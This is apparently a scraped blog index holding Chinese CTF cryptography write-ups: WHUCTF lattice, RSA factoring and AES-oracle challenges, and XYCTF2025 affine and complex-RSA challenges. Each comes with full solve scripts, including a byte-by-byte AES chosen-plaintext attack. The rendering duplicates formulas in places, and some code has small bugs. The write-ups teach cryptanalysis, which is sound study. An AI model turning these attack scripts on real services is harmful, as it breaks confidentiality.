(512-2*l)*'0' + ql    if(int(p_max,2) * int(q_max,2) &lt; n):        return    if(int(p_min,2) * int(q_min,2) &gt; n):        return    if(int(pl,2) * int(ql,2)  %  (2**(l-1)) != n % (2**(l-1))):        return        if(l == 256):        pp0 = int(p_max,2)        if(n % pp0 == 0):            pf = pp0            qf = n//pp0            phi = (pf - 1)*(qf - 1)            d = inverse(e,phi)            m1 = pow(c,d,n)            print(long_to_bytes(m1))            exit()    else:        find(ph+'1',qh+'1')        find(ph+'1',qh+'0')        find(ph+'0',qh+'1')        find(ph+'0',qh+'0')find('1','1')# WHUCTF{cryptography_and_reverse}\n\n\n *ez_lattice\n\n\n格密码相关，题干\nfrom Crypto.Util.number import *flag = b\"whuctf{}\"blen = 512l = len(flag) // 4 #未知n = 2X = []a = [bytes_to_long(flag[i * l: i * l + l]) for i in range(2)] #切成两部分b = 0p = getPrime(blen)for i in range(2):    X.append(getRandomNBitInteger(blen))    b = (a[i] * X[i]) % p       assert b.bit_length() &lt; 110print(\"p =\", p)print(\"X =\", X) # p = 12478746590758967738992827236548867094406642228843048782158822830242432957850861746109083849369751421558416546441433265483311369062332823391326650330844473# X = [4370703796271085517745653374714633557060694569231794372714420305839580193452505356598920188429238758568075323630107438853033389535935767953293146851021439, 5636765597544539887670148818611437395262628189014720546978418282055551396918915796702935478309173130501906553399905160951176701403838275497327658585404887]n = 2X = []a = [bytes_to_long(flag[i * l: i * l + l]) for i in range(2, 4)]print(a)p = getPrime(blen)for i in range(n):    X.append(getRandomNBitInteger(blen))    b = (a[i] * X[i]) % p    assert b.bit_length() &lt;= 55s = getRandomNBitInteger(55)P = p - sprint(\"P =\", P)print(\"X =\", X)# P = 8064317391291915578249751043887298750752952396481901402238164933671762816998644264248732894561122039999833298392825353792148892469165631966482732750535761# X = [6042201174605160506707043360458329015685676206288676104013330039569480295420873678739841513174948925787517746114885517054730046775608073287427260847787072, 6232867934334525782602291010514616748943593081406115516232887372014738839717093295759414233886061184914495957664550361507367497641317336980894814940037711]\n简单分析可知分为两个部分，前半段是\nb=kp+aiXi\nb = kp+a_iX_i\n\nb=kp+ai​Xi​\n本质是两个方程，这里有两种方法可以解决，都写一下\n\n\n1.根据两个方程造3 * 3的格子\n将上式展开，有\n\n\nb=kp+a1X1b=kp+a2X2\n\\begin{aligned}\nb &amp;= kp + a_1 X_1\\\\\nb &amp;= kp + a_2 X_2\n\\end{aligned}\n\nbb​=kp+a1​X1​=kp+a2​X2​​\n观察式子，不难得到矩阵运算式\n(a1,a2,k)(10X101X200p)=(a1,a2,2b)\n(a_1,a_2,k)\\begin{pmatrix}\n  1&amp;0&amp;X_1\\\\\n  0&amp;1&amp;X_2\\\\\n  0&amp;0&amp;p\n  \\end{pmatrix}=(a_1,a_2,2b)\n\n(a1​,a2​,k)⎝⎛​100​010​X1​X2​p​⎠⎞​=(a1​,a2​,2b)\n接下来运用Hermite\n上界为3p13\\sqrt{3} p^{\\frac13}3​p31​ ,大概是170位，右边的目标向量长度取决于a1,a2,b但肯定不会超过上界，我们可以先解一下看看\nX1 = X[0]X2 = X[1]# 构造 3×3 格基L = Matrix(ZZ, [    [1, 0, X1],    [0, 1, X2],    [0, 0, p]])a1 = L.LLL()[0][0]a2 = L.LLL()[0][1]a1 = abs(a1)a2 = abs(a2)print(long_to_bytes(a1))print(long_to_bytes(a2))#b'whuctf{'#b'Lattice'\n\n一个思路更简单的思路，感谢(zijeff (github.com))\n\nL0 = Matrix(ZZ,[    [1,X[0]],    [0,p]])M0 = L0.LLL()[0]  v0 = L0.solve_left(M0) for i in range(1,10000):    a0 = abs(v0[0]) * i    m0 = long_to_bytes(int(a0))    tag = True    for m in m0:        if not chr(m) in string.printable:            tag = false            break    if tag:        print(long_to_bytes(int(a0)))\n\n\n *pollard&amp;williams\n\n\nfrom Crypto.Util.number import *import osflag = b'whuctf{}'blen = 256def rsa(p, q, message):    n = p * q    e = 65537    pad_length = n.bit_length() // 8 - len(message) - 2 #块长为 n的长度除8（字节数） 减去mes长度再减2    message += os.urandom(pad_length) #生成pad_length个随机字节    m = bytes_to_long(message)    return n, pow(m, e, n)def part1(message1, message2):    while True:        p1 = getPrime(blen)        p2 = (p1 - 1) // 2 #相当于p1右移一位，且放掉最低位        if isPrime(p2):            break    q1 = getPrime(blen)    q2 = getPrime(blen)    return rsa(p1, q1, message1), rsa(p2, q2, message2)def part2(message1, message2):    while True:        p1 = getPrime(blen)        p2 = (p1 + 1) // 2 #没有明显关系        if isPrime(p2):            break    q1 = getPrime(blen)    q2 = getPrime(blen)    return rsa(p1, q1, message1), rsa(p2, q2, message2)assert len(flag) == 44l = len(flag) // 4m1, m2, m3, m4 = [flag[i * l: i * l + l] for i in range(4)]# 切成四段c1, c2 = part1(m1, m2)c3, c4 = part2(m3, m4)print(f'{c1 = }')print(f'{c2 = }')print(f'{c3 = }')print(f'{c4 = }')# c1 = (6053032598894343876848386724367478876865502990878797490385487692233771017587839889683279773931697102081210221515871925626229356354906807395177342943323369, 4066195854081844630643812355140109730178549671457699640787009592379117222130777528564788537029636082768525403919530491221982157867347461546035515101540809)# c2 = (3881600892538209342174115382004433032693183438455968854185245139152150453077746028435728337685187304179257593974737056409431270271087770400534952463611803, 3170419555737452151768856928448822332346045957475336562622244748908867061340721719260259808765271614258250388620180512676045609008728482012225062330421389)# c3 = (12299016617136978588548772285625358530978334196485520160172325214608426825374255755330322407319092229940503630270734074076341447314630647646764214262929507, 318163940794629731124968470499655451861010987042419720693423620230895540439020747998494269609254222775880714679954773027280497632868550785421041286883861)# c4 = (4549315768074822845197072475333248869579555413221208949230121240611191001190288208256119819724334902434536556333152862828649067092565476816480268615884657, 1882968780168858989700488482275734089425710600149658668167954773629584030303631176914870357507995175067079535271674721507969999430710585448040194277936142)\n基于pollard p-1和willams p+1两个大数分解算法\n\n\n1\n可知(p1−1)∣2n2(p_1-1) | 2n_2(p1​−1)∣2n2​ 由欧拉定理不难得到\n\n\np_1;|;2^{2n_2}-1\\\np_1 = gcd(n_1,2^{2n_2-1})\n\n\n直接算就行，代码如下&lt;!−−code￼8−−&gt;−2证明比较繁琐，先给出结论对于如下Lucas序列  直接算就行，代码如下\n  \n  p1 = gmpy2.gcd(gmpy2.powmod(3, 2 * n2, n1) - 1, n1)p2 = (p1 - 1) // 2q1 = n1 // p1q2 = n2 // p2\n  \n- 2\n\n  证明比较繁琐，先给出结论\n\n  对于如下Lucas序列\n直接算就行，代码如下&lt;!−−code￼8−−&gt;−2证明比较繁琐，先给出结论对于如下Lucas序列\n$V_0 = 2\\\nV_1 = A\\\nV_n = AV_{n-1}-V_{n-2}\\\n  令,若  有 \n\np;| gcd(V_m-2,n) ;; p|n;;p-(\\frac D p );|;m;;\n  \n\n思路就是，枚举A，1到15往往就够了，找到一个D不是p的二次剩余，也就是有\n\n这里我们容易发现,那么2n2就是我们代入的m，接下来用我们枚举的A,找到的m来迭代运算lucas序列，求出来之后做两次gcd即可，最终\n\np_1 = gcd(gcd(V_{2n_2};-;2,n_1);,;n_1)\n脚本在这里\n\ndef lucas_v(a,n):    v0 = 2    v1 = a    R = ZZ     M = matrix(R,[[a,-1],[1,0]])     v = M**(n-1) * vector(R,[v1,v0])    return v[0]for a in range(2,10):    p3 = ZZ(gcd(lucas_v(a,2 * n4) - 2, n3))    if 1&lt; p3 &lt; n3:        breakp4 = (p3+1) // 2q3 = n3 // p3q4 = n4 // p4     \n\n\n\n- ## *seista's revenge\n\nfrom Crypto.Util.Padding import padfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom hashlib import *flag = b\"whuctf{}\"blen = 512p = getPrime(blen)s = getRandomNBitInteger(100)P = p + st = 2X = []a = [getPrime(160) for _ in range(t)]for i in range(t):    X.append(inverse(a[i], p))key = sha256(str(a[0]*a[1]).encode()).digest()[:16]iv = b\"0\" * 16AES = AES.new(key, AES.MODE_CBC, iv)print(\"X =\", X)print(\"P =\", P)print(\"ct =\", AES.encrypt(pad(flag, AES.block_size)))# X = [1266403423628708294851978766647131186574350037928491893316575383770634141679199238688724846443316942748685589080912612989737322832820423142859211423222170, 10633805933378187507165706136587361125130747673943368523389315948924728188453225153073019422908293191827053741582511390426559341625596650317484672418362991]# P = 12727949469666331910572325155797935927989546075198211256583307434798528241134917675474139742863165705376701853130873014549089300596914514323642506815012401# ct = b'\\xe9\\x87\\x942\\xbc\\x94`t\\x85^r\\xb8\\xd2\\x00\\xfb\\xb0Ni\\x08\\xcf\\x07\\xf1\\xae\\x95U{\\xf1\\xd4\\xda}@H'# Lattice\n\n\n\nez_lattice的part2稍微改了一下上来的，求a0,a1就可以了\n\n这里有\n\na_iX_i \\equiv 1;;mod p\\\n\n\n其实不论b怎么样，我们都是用类似的方法求解\n\nfrom Crypto.Util.number import *import gmpy2from sage.all import *import libnumimport stringfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadfrom hashlib import sha256X = [1266403423628708294851978766647131186574350037928491893316575383770634141679199238688724846443316942748685589080912612989737322832820423142859211423222170, 10633805933378187507165706136587361125130747673943368523389315948924728188453225153073019422908293191827053741582511390426559341625596650317484672418362991]P = 12727949469666331910572325155797935927989546075198211256583307434798528241134917675474139742863165705376701853130873014549089300596914514323642506815012401ct = b'\\xe9\\x87\\x942\\xbc\\x94`t\\x85^r\\xb8\\xd2\\x00\\xfb\\xb0Ni\\x08\\xcf\\x07\\xf1\\xae\\x95U{\\xf1\\xd4\\xda}@H'# 这里s只有100位，可以估计二者是几乎相等的L0 = Matrix(ZZ,[    [1,X[0]],    [0,P]])M0 = L0.LLL()W0 = M0[0]v0 = L0.solve_left(W0) L1 = Matrix(ZZ,[    [1,X[1]],    [0,P]])M1 = L1.LLL()W1 = M1[0]v1 = L1.solve_left(W1)for i in range(1,10000):    a = abs(v0[0] * v1[0]) * i    key = sha256(str(a).encode()).digest()[:16]    iv = b\"0\" * 16    AES_cipher = AES.new(key, AES.MODE_CBC, iv)    decrypted_data = unpad(AES_cipher.decrypt(ct), AES.block_size)    m0 = decrypted_data.decode()    tag = True    for m in m0:        if not m in string.printable:            tag = false            break    if tag:        print(m0)        # whuctf{You_w1ll_never_kn0w_1t!}\n\n- ## onlyAES\n\n交互题，代码如下\n\nimport osimport socketimport threadingfrom Crypto.Cipher import AESfrom Crypto.Random import get_random_bytesfrom Crypto.Util.Padding import pad, unpadfrom string import ascii_lowercaseglobal flagdef xor(a, b):    if len(a) &lt; len(b):        a, b = b, a    c = []    for i in range(len(a)):        c.append(a[i] ^ b[i % len(b)])    return bytes(c)class myAES:    def __init__(self):        self.flag = flag        self.key = get_random_bytes(16)        self.cipher = AES.new(self.key, AES.MODE_ECB)    def encrypt1(self, data):        \"\"\"先异或flag，再加密\"\"\"        data = xor(data, self.flag)        pdata = pad(data, AES.block_size)        return self.cipher.encrypt(pdata).hex().encode()    def encrypt2(self, data):        \"\"\"拼接flag，将每个块的加密结果异或得到最终结果\"\"\"        data = data + self.flag        pdata = pad(data, AES.block_size)        c = self.cipher.encrypt(pdata)        C = [c[i : i + 16] for i in range(0, len(c), 16)]        for i in range(1, len(C)):            C[0] = xor(C[0], C[i])        return C[0].hex().encode()def challenge(client: socket.socket):    cipher = myAES()    client.sendall(b\"Here is an AES system, try hack it !\\n\")    client.sendall(b\"\\t1. Encrypt 1  \\n\")    client.sendall(b\"\\t2. Encrypt 2  \\n\")    while 1:        try:            client.sendall(b\"your choice &gt; \")            try:                cho = int(client.recv(1024).decode().strip())            except ValueError:                client.sendall(b\"Invalid choice!\\n\")                continue        except:            break        if cho == 1:            client.sendall(b\"Input your data(hex): \")            try:                data = bytes.fromhex(client.recv(1024).strip().decode())                if len(data) == 0:                    client.sendall(b\"No input!\\n\")                    continue                client.sendall(b\"Encrypted data(hex): \" + cipher.encrypt1(data) + b\"\\n\")            except Exception as e:                print(e)                client.sendall(b\"Invalid data!\\n\")        elif cho == 2:            client.sendall(b\"Input your data(hex): \")            try:                data = bytes.fromhex(client.recv(1024).strip().decode())                if len(data) == 0:                    client.sendall(b\"No input!\\n\")                    continue                client.sendall(b\"Encrypted data(hex): \" + cipher.encrypt2(data) + b\"\\n\")            except Exception as e:                print(e)                client.sendall(b\"Invalid data!\\n\")                continue        else:            client.sendall(b\"Invalid choice!\\n\")            continuedef main():    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    server.bind((\"0.0.0.0\", 2025))    server.listen(2)    server.settimeout(5)    try:        while True:            try:                client, addr = server.accept()                client_thread = threading.Thread(target=challenge, args=(client,))                client_thread.start()            except socket.timeout:                pass    except KeyboardInterrupt:        server.close()if __name__ == \"__main__\":    flag = os.getenv(\"GZCTF_FLAG\")    flag = flag.lstrip(\"WHUCTF{\").rstrip(\"}\")    charset = ascii_lowercase + \"_\"    assert len(flag) % 16 == 3    assert all(c in charset for c in flag)    flag = flag.encode()    main()\n\n可见就是选择一种加密方式，再输入data数据，进行加密，注意这里的异或方法\n\n对于第一种加密方式，输入全0的data块，那么实际上就是对flag进行了一次加密，不妨设flag是两个块+3个字符，那么容易有填充后得到flag0 flag1 Pad(flag2)这三个块，加密后得到encflag0 encflag1 encPad(flag2)三个块，截取前面两个\n\n对于第二种加密方式是先将flag拼接在输入的data后方，再16字节分块，加密之后用一个C存储各个块异或的结果，如果我们输入了Pad(flag2)，那么Pad之后会得到 Pad(flag2) flag0 flag1 Pad(flag2) 加密得到encPad(flag2) encflag0 encflag1 encPad(flag2),异或的结果就会是encflag0 XOR encflag1，然而这个我们是知道的，由第一次加密的结果，也就是说，我们穷举flag3所有的可能，一共也就27^3种，pad之后传入，只要输出的值为encflag1 XOR encflag0 那么我们就构造对了\n\n接下来，我们应用这里的异或性质，构造比flag长1位的0串，那么flag0的第一位会复制到flag3的末尾，这时候如法炮制爆破现在的flag3就可以了，能在27次以内搞出来，以此循环即可，稍微注意下当爆破位数超过16时候的块构造\n\n贴一下出题人keaton师傅的题解\n\ndef enc1(data: bytes) -&gt; bytes:    r.sendlineafter(b\"your choice &gt; \", b\"1\")    data = data.hex().encode()    r.sendlineafter(b\"Input your data(hex): \", data)    encdata = r.recvline_contains(b\"Encrypted data(hex): \").strip().split(b\": \")[1]    return bytes.fromhex(encdata.decode())def enc2(data: bytes) -&gt; bytes:    r.sendlineafter(b\"your choice &gt; \", b\"2\")    data = data.hex().encode()    r.sendlineafter(b\"Input your data(hex): \", data)    encdata = r.recvline_contains(b\"Encrypted data(hex): \").strip().split(b\": \")[1]    return bytes.fromhex(encdata.decode())def getTail():    \"\"\"尾部有几个字节数据的单块\"\"\"    encflag = enc1(b\"\\x00\" * flag_len)    print(\"flag密文：\", encflag.hex()) #flag各个块加密后的结果    encflag = [encflag[i : i + 16] for i in range(0, len(encflag), 16)] #密文分块    for i in product(charset[::-1], repeat=tail_len):        data = (\"\".join(i)).encode()        print(data) #穷举所有可能的flag末尾3位        pdata = pad(data, AES.block_size)        res = enc2(pdata)        if res == xor(*encflag[: len(encflag) - 1]):            print(\"尾部：\", data)            return datadef recover():    \"\"\"逐字节破解\"\"\"    flag = getTail()    mask = enc2(b\"a\" * 32) #得到encflag0 XOR encflag1 XOR encPad(flag2)    mask = xor(*[mask[i : i + 16] for i in range(0, len(mask), 16)])     for i in range(1, flag_len + 1 - tail_len):        c1 = enc1(b\"\\x00\" * (flag_len + i))        c1 = [c1[_ : _ + 16] for _ in range(0, len(c1), 16)]        for j in charset:            data = flag + j.encode()            print(data)            pdata = pad(data, AES.block_size)            res = enc2(pdata)            if xor(res, mask) == xor(*c1[(flag_len // 16) :]):                flag += j.encode()                print(flag[tail_len:] + flag[:tail_len])                break    flag = flag[tail_len:] + flag[:tail_len]    flag = \"WHUCTF{\" + flag.decode() + \"}\"    print(flag)if __name__ == \"__main__\":    tail_len = 3    flag_len = 35    recover()\n\n\n\n---\n\n## 碎碎念\n\n第一次正式接触比赛中的密码题，和校内23 24级的其他师傅有着不小的差距，也是逐渐意识到了各类板子，思路的重要性，写复盘的初衷也是希望以后或许用得到其中的思路&amp;脚本，不过python代码能力确实还得好好练习呢，加油\n\n","categories":["WP"],"tags":["CTF","RSA","格密码","剪枝","AES"]},{"title":"XYCTF2025","url":"/2025/04/19/XYCTF2025/","content":" 1.reed\nimport stringimport randomfrom secret import flagassert flag.startswith('XYCTF{') and flag.endswith('}')flag = flag.rstrip('}').lstrip('XYCTF{')table = string.ascii_letters + string.digitsassert all(i in table for i in flag)r = random.Random()class PRNG:    def __init__(self, seed):        self.a = 1145140        self.b = 19198100        random.seed(seed)    def next(self):        x = random.randint(self.a, self.b)        random.seed(x ** 2 + 1)        return x        def round(self, k):        for _ in range(k):            x = self.next()        return xdef encrypt(msg, a, b):    c = [(a * table.index(m) + b) % 19198111 for m in msg]    return cseed = int(input('give me seed: '))prng = PRNG(seed)a = prng.round(r.randrange(2**16))b = prng.round(r.randrange(2**16))enc = encrypt(flag, a, b)print(enc)\n输一个seed进去，然后影响prng的状态，再生成系数a,b,用ci≡ami+b  mod  pc_i\\equiv am_i+b\\;mod\\;pci​≡ami​+bmodp这里的ci,p都知道，实际上没什么必要管prng的生成逻辑，可知mi的取值只有所有数字和大小写字母，也就是62个取值可能，我们找两组不一样的ci,cj有\nci≡ami+b  mod  p\nc_i\\equiv am_i+b\\;mod\\;p\\\\\n\nci​≡ami​+bmodp\ncj≡amj+b  modp\nc_j\\equiv am_j+b\\;modp\\\\\n\ncj​≡amj​+bmodp\n做差有(ci−cj)≡a(mi−mj)  mod  p\n做差有(c_i-c_j)\\equiv a(m_i-m_j)\\;mod\\;p\n\n做差有(ci​−cj​)≡a(mi​−mj​)modp\n穷举所有可能的mi,mj的取值，也就3600多种，可以解出\na≡(ci−cj)(mi−mj)−1  mod  p\na\\equiv (c_i-c_j)(m_i-m_j)^{-1}\\;mod\\;p\\\\\n\na≡(ci​−cj​)(mi​−mj​)−1modp\n再代入可得\nb≡ci−mi(ci−cj)(mi−mj)−1  mod  p\nb\\equiv c_i-m_i(c_i-c_j)(m_i-m_j)^{-1}\\;mod\\;p\\\\\n\nb≡ci​−mi​(ci​−cj​)(mi​−mj​)−1modp\n这下我们就得到了a,b再对后面的所有已知的c，可得\nmk≡(ck−b)a−1  mod  p\nm_k\\equiv(c_k-b)a^{-1}\\;mod\\;p\\\\\n\nmk​≡(ck​−b)a−1modp\n解出所有可能的m_k，看看是不是在0~61内，脚本如下\nimport stringtable = string.ascii_letters + string.digits  # 62 charactersmod = 19198111def extended_gcd(a, b):    if a == 0:        return (b, 0, 1)    else:        g, y, x = extended_gcd(b % a, a)        return (g, x - (b // a) * y, y)def modular_inverse(a, m):    g, x, y = extended_gcd(a, m)    if g != 1:        return None  # No inverse    else:        return x % menc = [4468502, 4468502, 15719774, 272087, 4468502, 15719774, 16429260, 8482421, 7144448, 12678836, 8928412, 15537278, 11786854, 8482421, 8036430, 11340863, 8482421, 7590439, 7590439, 11786854, 8928412, 16875251, 8036430, 981573, 12678836, 3840015, 11786854, 15091287, 7590439, 4468502, 15273783, 4468502, 15273783, 11523359, 4468502, 718078]c0 = enc[0]c2 = enc[2]solutions = []for m0 in range(len(table)):    for m2 in range(len(table)):        if m0 == m2:            continue        delta_m = m2 - m0        delta_c = (c2 - c0) % mod        inv_dm = modular_inverse(delta_m, mod)        if inv_dm is None:            continue        a = (delta_c * inv_dm) % mod        inv_a = modular_inverse(a, mod)        if inv_a is None:            continue        b = (c0 - a * m0) % mod        valid = True        plain = []        for c in enc:            m = ((c - b) * inv_a) % mod            if m &lt; 0 or m &gt;= len(table):                valid = False                break            plain.append(table[m])        if valid:            solutions.append((a, b, ''.join(plain)))if solutions:    print(\"Possible solutions:\")    for a, b, plain in solutions:        print(f\"a = {a}, b = {b}\")        print(f\"Flag: XYCTF{{{plain}}}\\n\")else:    print(\"No valid solutions found.\")#Possible solutions:#a = 3750424, b = 16875251#Flag: XYCTF{114514fixedpointissodangerous1919810}\n不过这貌似是出题人的非预期解，等有师傅分享了关于PRNG不动点的解法的话再补充吧\n 2.Complex-signin\nfrom Crypto.Util.number import *from Crypto.Cipher import ChaCha20import hashlibfrom secret import flag# 复数class Complex:    def __init__(self, re, im):        self.re = re        self.im = im    def __mul__(self, c):        re_ = self.re * c.re - self.im * c.im        im_ = self.re * c.im + self.im * c.re        return Complex(re_, im_)    def __eq__(self, c):        return self.re == c.re and self.im == c.im    def __rshift__(self, m):        return Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)    def __lshift__(self, m):        return Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)    def __str__(self):        if self.im == 0:            return str(self.re)        elif self.re == 0:            if abs(self.im) == 1:                return f\"{'-' if self.im &lt; 0 else ''}i\"            else:                return f\"{self.im}i\"        else:            return f\"{self.re} {'+' if self.im &gt; 0 else '-'} {abs(self.im)}i\"    def tolist(self):        return [self.re, self.im]# 快速幂def complex_pow(c, exp, n):    result = Complex(1, 0)    while exp &gt; 0:        if exp &amp; 1:            result = result * c            result.re = result.re % n            result.im = result.im % n        c = c * c        c.re = c.re % n        c.im = c.im % n        exp &gt;&gt;= 1    return resultbits = 128p = getPrime(1024)q = getPrime(1024)n = p * qm = Complex(getRandomRange(1, n), getRandomRange(1, n))e = 3c = complex_pow(m, e, n)print(f\"n = {n}\")print(f\"mh = {(m &gt;&gt; bits &lt;&lt; bits).tolist()}\")print(f\"C = {c.tolist()}\")print(f\"enc = {ChaCha20.new(key=hashlib.sha256(str(m.re + m.im).encode()).digest(), nonce=b'Pr3d1ctmyxjj').encrypt(flag)}\")'''n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]enc = b'\\x9c\\xc4n\\x8dF\\xd9\\x9e\\xf4\\x05\\x82!\\xde\\xfe\\x012$\\xd0\\x8c\\xaf\\xfb\\rEb(\\x04)\\xa1\\xa6\\xbaI2J\\xd2\\xb2\\x898\\x11\\xe6x\\xa9\\x19\\x00pn\\xf6rs- \\xd2\\xd1\\xbe\\xc7\\xf51.\\xd4\\xd2 \\xe7\\xc6\\xca\\xe5\\x19\\xbe''''\n基于二元复数的RSA运算，题目给出了m实、虚部的高位，同时e的数值为3，可以考虑设低位，展开成多项式，去打二元coppersmith，推导如下\nRem=mh[0]+x  ;Imm=mh[1]+y\nRe_{m}=mh[0]+x\\;;Im_m=mh[1]+y\\\\\n\nRem​=mh[0]+x;Imm​=mh[1]+y\n又C≡(mh[0]+x+(mh[1]+y)i)3  mod  n\n又C\\equiv(mh[0]+x+(mh[1]+y)i)^3\\;mod\\;n\\\\\n\n又C≡(mh[0]+x+(mh[1]+y)i)3modn\n整理得到\n\\text{整理得到}\\\\\n\n整理得到\nReC≡(mh[0]+x)3−3(mh[0]+x)(mh[1]+y)2  mod  n\nRe_C\\equiv (mh[0]+x)^3-3(mh[0]+x)(mh[1]+y)^2\\;mod\\;n\\\\\n\nReC​≡(mh[0]+x)3−3(mh[0]+x)(mh[1]+y)2modn\nImC≡−(mh[1]+y)3+3(mh[0]+x)2(mh[1]+y)  mod  n\nIm_C\\equiv-(mh[1]+y)^3+3(mh[0]+x)^2(mh[1]+y)\\;mod\\;n\\\\\n\nImC​≡−(mh[1]+y)3+3(mh[0]+x)2(mh[1]+y)modn\n只有x,y未知，这里给一个二元copper的脚本，感谢(defund/coppersmith: Coppersmith’s method for multivariate polynomials (github.com))和使用轮子的exp\n#sageimport itertoolsdef small_roots(f, bounds, m=1, d=None):\tif not d:\t\td = f.degree()\tif isinstance(f, Polynomial):\t\tx, = polygens(f.base_ring(), f.variable_name(), 1)\t\tf = f(x)\tR = f.base_ring()\tN = R.cardinality()\t\tf /= f.coefficients().pop(0)\tf = f.change_ring(ZZ)\tG = Sequence([], f.parent())\tfor i in range(m+1):\t\tbase = N^(m-i) * f^i\t\tfor shifts in itertools.product(range(d), repeat=f.nvariables()):\t\t\tg = base * prod(map(power, f.variables(), shifts))\t\t\tG.append(g)\tB, monomials = G.coefficient_matrix()\tmonomials = vector(monomials)\tfactors = [monomial(*bounds) for monomial in monomials]\tfor i, factor in enumerate(factors):\t\tB.rescale_col(i, factor)\tB = B.dense_matrix().LLL()\tB = B.change_ring(QQ)\tfor i, factor in enumerate(factors):\t\tB.rescale_col(i, 1/factor)\tH = Sequence([], f.parent().change_ring(QQ))\tfor h in filter(None, B*monomials):\t\tH.append(h)\t\tI = H.ideal()\t\tif I.dimension() == -1:\t\t\tH.pop()\t\telif I.dimension() == 0:\t\t\troots = []\t\t\tfor root in I.variety(ring=ZZ):\t\t\t\troot = tuple(R(root[var]) for var in f.variables())\t\t\t\troots.append(root)\t\t\treturn roots\treturn []\nexp\nfrom sage.all import *import itertools# from coppersmith import small_rootsfrom Crypto.Cipher import ChaCha20from hashlib import sha256def small_roots(f, bounds, m=1, d=None):    if not d:        d = f.degree()    R = f.base_ring()    N = R.cardinality() #取得模数    f /= f.coefficients().pop(0) #最高次项系数化为0，coefficients是多项式的降次幂排列系数    f = f.change_ring(ZZ)    G = Sequence([], f.parent())    for i in range(m + 1):        base = N ** (m - i) * f ** i #收集基多项式        for shifts in itertools.product(range(d), repeat=f.nvariables()):            g = base * prod(map(power, f.variables(), shifts))            G.append(g)    # print(G)    B, monomials = G.coefficient_matrix()    monomials = vector(monomials)    factors = [monomial(*bounds) for monomial in monomials]    for i, factor in enumerate(factors):        B.rescale_col(i, factor)    B = B.dense_matrix().LLL()    B = B.change_ring(QQ)    for i, factor in enumerate(factors):        B.rescale_col(i, 1 / factor)    H = Sequence([], f.parent().change_ring(QQ))    for h in filter(None, B * monomials):        H.append(h)        I = H.ideal()        if I.dimension() == -1:            H.pop()        elif I.dimension() == 0:            roots = []            for root in I.variety(ring=ZZ):                root = tuple(R(root[var]) for var in f.variables())                roots.append(root)            return roots    return []n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 